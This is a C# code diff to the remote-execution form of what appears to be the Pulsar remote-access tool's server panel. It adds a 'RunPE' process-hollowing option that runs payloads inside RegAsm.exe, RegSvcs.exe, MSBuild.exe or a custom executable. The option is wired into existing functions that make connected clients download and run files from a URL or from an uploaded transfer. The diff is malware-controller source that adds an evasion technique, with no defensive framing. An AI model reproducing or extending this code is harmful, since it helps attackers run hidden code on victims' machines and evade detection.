@@ -35,6 +35,9 @@ namespace Pulsar.Server.Forms
 
         private bool _isUpdate;
         private bool _executeInMemoryDotNet;
+        private bool _useRunPE;
+        private string _runPETarget;
+        private string _runPECustomPath;
 
         public FrmRemoteExecution(Client[] clients, bool Updating = false)
         {
@@ -44,6 +47,8 @@ namespace Pulsar.Server.Forms
             InitializeComponent();
 
             chkUpdate.Checked = Updating;
+
+            cmbRunPETarget.SelectedIndex = 0;
 
             DarkModeManager.ApplyDarkMode(this);
 			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
@@ -115,6 +120,27 @@ namespace Pulsar.Server.Forms
         {
             _isUpdate = chkUpdate.Checked;
             _executeInMemoryDotNet = chkBoxReflectionExecute.Checked;
+            _useRunPE = chkRunPE.Checked;
+
+            if (_useRunPE)
+            {
+                switch (cmbRunPETarget.SelectedIndex)
+                {
+                    case 0: _runPETarget = "a"; break; // RegAsm.exe
+                    case 1: _runPETarget = "b"; break; // RegSvcs.exe
+                    case 2: _runPETarget = "c"; break; // MSBuild.exe
+                    case 3: 
+                        _runPETarget = "d"; // Custom Path
+                        _runPECustomPath = txtRunPECustomPath.Text;
+                        if (string.IsNullOrWhiteSpace(_runPECustomPath))
+                        {
+                            MessageBox.Show("Please specify a custom path for RunPE.", "RunPE Custom Path Required", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                            return;
+                        }
+                        break;
+                    default: _runPETarget = "a"; break;
+                }
+            }
 
             if (radioURL.Checked)
             {
@@ -123,7 +149,7 @@ namespace Pulsar.Server.Forms
                     if (!txtURL.Text.StartsWith("http"))
                         txtURL.Text = "http://" + txtURL.Text;
 
-                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate, _executeInMemoryDotNet);
+                    handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
                 }
             }
             else
@@ -177,7 +203,7 @@ namespace Pulsar.Server.Forms
 
                     if (transfer.Status == "Completed")
                     {
-                        handler.TaskHandler.StartProcess(transfer.RemotePath, _isUpdate, _executeInMemoryDotNet);
+                        handler.TaskHandler.StartProcess(transfer.RemotePath, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
                     }
                     return;
                 }
@@ -216,6 +242,64 @@ namespace Pulsar.Server.Forms
                 {
                     lstTransfers.Items[i].SubItems[(int)TransferColumn.Status].Text = result ? "Successfully started process" : "Failed to start process";
                     return;
+                }
+            }
+        }
+
+        private void chkBoxReflectionExecute_CheckedChanged(object sender, EventArgs e)
+        {
+            if (chkBoxReflectionExecute.Checked)
+            {
+                chkRunPE.Checked = false;
+                chkUpdate.Checked = false;
+            }
+        }
+
+        private void chkUpdate_CheckedChanged(object sender, EventArgs e)
+        {
+            if (chkUpdate.Checked)
+            {
+                chkBoxReflectionExecute.Checked = false;
+                chkRunPE.Checked = false;
+            }
+        }
+
+        private void chkRunPE_CheckedChanged(object sender, EventArgs e)
+        {
+            if (chkRunPE.Checked)
+            {
+                chkBoxReflectionExecute.Checked = false;
+                chkUpdate.Checked = false;
+                cmbRunPETarget.Enabled = true;
+            }
+            else
+            {
+                cmbRunPETarget.Enabled = false;
+                txtRunPECustomPath.Visible = false;
+                txtRunPECustomPath.Enabled = false;
+                btnBrowseRunPE.Visible = false;
+                btnBrowseRunPE.Enabled = false;
+            }
+        }
+
+        private void cmbRunPETarget_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            bool isCustomPath = cmbRunPETarget.SelectedIndex == 3;
+            txtRunPECustomPath.Visible = isCustomPath;
+            txtRunPECustomPath.Enabled = isCustomPath;
+            btnBrowseRunPE.Visible = isCustomPath;
+            btnBrowseRunPE.Enabled = isCustomPath;
+        }
+
+        private void btnBrowseRunPE_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog())
+            {
+                ofd.Multiselect = false;
+                ofd.Filter = "Executable Files (*.exe)|*.exe|All Files (*.*)|*.*";
+                if (ofd.ShowDialog() == DialogResult.OK)
+                {
+                    txtRunPECustomPath.Text = ofd.FileName;
                 }
             }
         }
